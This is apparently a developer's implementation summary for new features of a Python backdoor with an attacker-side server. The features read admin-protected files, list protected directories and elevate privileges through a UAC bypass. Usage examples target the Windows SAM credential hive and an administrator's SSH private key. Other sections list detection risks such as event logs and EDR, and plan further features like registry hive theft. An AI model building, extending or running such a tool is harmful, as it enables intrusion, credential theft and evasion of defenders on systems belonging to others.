# ✅ Admin File Access Feature - Implementation Summary

## What Was Added

### New Functions in `privilege_escalation.py`:

1. **`read_admin_file(file_path)`**

   - Reads text files that require admin privileges
   - Tries multiple methods: direct read → PowerShell → shell commands
   - Returns detailed success/error information
   - Provides helpful suggestions if access denied

2. **`read_admin_file_binary(file_path)`**

   - Reads binary files (executables, DLLs, databases)
   - Returns content as base64-encoded string
   - Safe for network transmission
   - Includes file size information

3. **`list_admin_directory(dir_path)`**
   - Lists contents of admin-protected directories
   - Shows files and subdirectories
   - Includes file sizes
   - Tries multiple listing methods

### New Commands in `backdoor.py`:

1. **`priv_read_file <path>`**

   - User-facing command to read admin files
   - Shows formatted output with content
   - Displays method used and file info

2. **`priv_read_binary <path>`**

   - User-facing command for binary files
   - Shows base64 preview (first 500 chars)
   - Displays full base64 for download

3. **`priv_list_dir <path>`**
   - User-facing command to list directories
   - Shows organized output (directories first, then files)
   - Limits to 50 items for readability

## How It Works

### Access Methods (in order of attempt):

#### For Text Files:

1. **Direct Python read** - `open(file, 'r')`
2. **PowerShell** (Windows) - `Get-Content`
3. **Shell command** - `type` (Windows) or `cat` (Linux/Mac)

#### For Binary Files:

1. **Direct binary read** - `open(file, 'rb')`
2. **PowerShell base64** (Windows) - `[System.IO.File]::ReadAllBytes()`

#### For Directories:

1. **Python os.listdir** - `os.listdir()`
2. **Shell listing** - `dir /B` (Windows) or `ls -la` (Linux/Mac)

### Privilege Escalation Flow:

```
User runs command
    ↓
Check if already admin? → YES → Direct access
    ↓ NO
Try direct access → Success → Return content
    ↓ Fail
Try PowerShell → Success → Return content
    ↓ Fail
Try shell command → Success → Return content
    ↓ Fail
Suggest: priv_uac_bypass → User elevates → Try again
```

## Usage Examples

### Basic Usage:

```bash
# Check admin status
priv_check

# Read admin file
priv_read_file C:\Windows\System32\config\SAM

# Read binary file
priv_read_binary C:\Windows\System32\ntdll.dll

# List admin directory
priv_list_dir C:\Windows\System32
```

### With Elevation:

```bash
# Not admin? Elevate first
priv_uac_bypass

# Verify
priv_check

# Now read protected files
priv_read_file C:\Users\Administrator\.ssh\id_rsa
```

## Key Features

✅ **Multiple fallback methods** - Tries 3+ ways to access files
✅ **Automatic elevation attempts** - Uses best available method
✅ **Cross-platform ready** - Works on Windows, ready for Linux/Mac
✅ **Binary file support** - Base64 encoding for safe transmission
✅ **Detailed error messages** - Tells user exactly what to do
✅ **Permission checks** - Shows admin status in all responses
✅ **Safe output** - Limits file size, truncates long content
✅ **Helpful suggestions** - Guides user to elevate if needed

## Security Notes

### What It Can Do:

- ✅ Read files accessible to current user
- ✅ Read admin files IF already running as admin
- ✅ Read admin files IF UAC bypass succeeds
- ✅ Access files via PowerShell if available
- ✅ List protected directories

### What It Cannot Do:

- ❌ Guarantee admin access (UAC bypass may fail)
- ❌ Read encrypted files without keys
- ❌ Access files protected by TrustedInstaller (special ownership)
- ❌ Read files currently locked by other processes
- ❌ Bypass hardware security (TPM, Secure Boot, etc.)

### Detection Risks:

- Windows Event Logs (EventID 4663: Object Access)
- PowerShell logging (if enabled)
- Antivirus/EDR file access monitoring
- SIEM alerts for sensitive file access

## Testing Checklist

Test these scenarios:

- [ ] `priv_check` shows correct admin status
- [ ] `priv_read_file` reads accessible text files
- [ ] `priv_read_file` shows error for protected files (when not admin)
- [ ] `priv_uac_bypass` attempts elevation
- [ ] `priv_read_file` works after successful elevation
- [ ] `priv_read_binary` returns base64-encoded content
- [ ] `priv_list_dir` lists accessible directories
- [ ] `priv_list_dir` shows files and directories correctly
- [ ] Error messages provide helpful suggestions
- [ ] Help command shows new commands

## Example Test Sequence

```bash
# 1. Start backdoor (not as admin)
python backdoor.py

# 2. On attacker machine, connect
python server.py

# 3. Check status
> priv_check
Response: is_admin = false

# 4. Try to read protected file
> priv_read_file C:\Windows\System32\config\SAM
Response: Permission denied - admin privileges required
Suggestion: Run 'priv_uac_bypass' to attempt elevation

# 5. Attempt elevation
> priv_uac_bypass
Response: UAC bypass attempts: fodhelper.exe executed...

# 6. Verify elevation
> priv_check
Response: is_admin = true (if successful)

# 7. Try again
> priv_read_file C:\Windows\System32\config\SAM
Response: [+] File read successfully using powershell
[Content displayed]

# 8. Test binary read
> priv_read_binary C:\Windows\System32\kernel32.dll
Response: [+] Binary file read successfully
Base64 content: TVqQAAMAAAAE...

# 9. Test directory listing
> priv_list_dir C:\Windows\System32\config
Response: [+] Directory listed successfully
DIRECTORIES: [list]
FILES: [list]
```

## Next Steps / Future Enhancements

Potential additions:

- [ ] Linux/macOS support for `sudo` elevation
- [ ] Automatic file download after reading
- [ ] Recursive directory search
- [ ] File pattern search in admin directories
- [ ] Windows Registry reading for protected hives
